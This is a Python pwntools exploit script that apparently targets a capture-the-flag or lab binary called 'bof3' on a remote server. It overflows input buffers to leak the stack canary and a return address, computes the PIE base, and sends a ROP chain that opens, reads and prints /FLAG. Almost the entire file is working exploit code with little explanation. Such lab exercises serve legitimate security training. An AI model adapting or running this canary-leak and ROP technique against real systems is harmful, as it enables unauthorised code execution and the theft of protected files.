#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os   = 'linux'

REMOTE = ('up.zoolab.org', 12344)
elf = ELF('./bof3')  

#msg_canary = elf.symbols['msg']
#print(f"[+] msg virtual canary  = {hex(msg_canary)}")


#r = process('./bof3')
r = remote(*REMOTE)
#==================================buf1==============================
r.recvuntil(b"name? ")
r.send(b"A" * (48+48+48+40)+b"W")  #sendline end with \n 

welcome = r.recvuntil(b"\nWhat's the room number?")

raw = welcome.split(b"Welcome, ")[1]  
lines = raw.split(b"W")
payload_line = lines[0]              # AAAAAAA
leak_line = lines[1]                 # canary  

canary = leak_line[:7]            
canary = u64(canary.ljust(8, b"\x00"))
canary*=256 #append 0x00

print(f"[DEBUG] wel = {welcome!r}")
print(f"[DEBUG] raw = {raw!r}")
print(f"[DEBUG] lines = {lines!r}")
print(f"[DEBUG] payl = {leak_line!r}")
log.success(f"canary  = {hex(canary)}") ##check


#pause()
#==========================================buf2==========================================
r.sendline(b"A" * (48+48+55))  #sendline end with \n 
room = r.recvuntil(b"customer's name? ")
print(f"[DEBUG] room = {room!r}")

lines = room.split(b"\n")
print(f"[DEBUG] lines = {lines!r}") 


payload_line = lines[0]              # AAAAAAA
leak_line = lines[1]                 # return address 

saved_rip = leak_line[:6]            
addr = u64(saved_rip.ljust(8, b"\x00"))
pie = addr - 0x9c83
log.success(f"leak  = {hex(addr)}")
log.success(f"PIE   = {hex(pie)}")
#pause()

#=================================buf3=======================================
r.sendline(b"A" * 10)

#=================================msg========================================
r.recvuntil(b"Leave your message: ")
elf.address = pie                 
rop  = ROP(elf)

pop_rdi      = rop.find_gadget(['pop rdi','ret'])[0]
pop_rsi_r15  = rop.find_gadget(['pop rsi','pop r15','ret'])[0]
pop_rdx      = rop.find_gadget(['pop rdx','ret'])[0]    

read  = elf.symbols['read']
open_ = elf.symbols['open']     #note open->kw
write = elf.symbols['write']
exit  = elf.symbols['exit']

bss        = elf.bss() + 0x800
log.info(f"Using .bss+0x800 @ {hex(bss)}")
rop.raw([ pop_rdi, 0,
          pop_rsi_r15, bss, 0,
          pop_rdx, 8,
          read ])                     

rop.raw([ pop_rdi, bss,
          pop_rsi_r15, 0, 0,
          open_ ])

rop.raw([ pop_rdi, 3,
          pop_rsi_r15, bss+0x100, 0,
          pop_rdx, 0x100,
          read ])

rop.raw([ pop_rdi, 1,
          pop_rsi_r15, bss+0x100, 0,
          pop_rdx, 0x100,
          write,
          exit ])

#rop.raw( elf.plt['exit'] )
chain = rop.chain()
payload = b"A" *40
payload += p64(canary)   
payload += b"A" *8
payload += chain

r.send(payload)
r.recvuntil(b"Thank you!\n")     # <-- new line

# path name
r.send(b"/FLAG\x00\x00\x00")

# show flag
r.interactive()
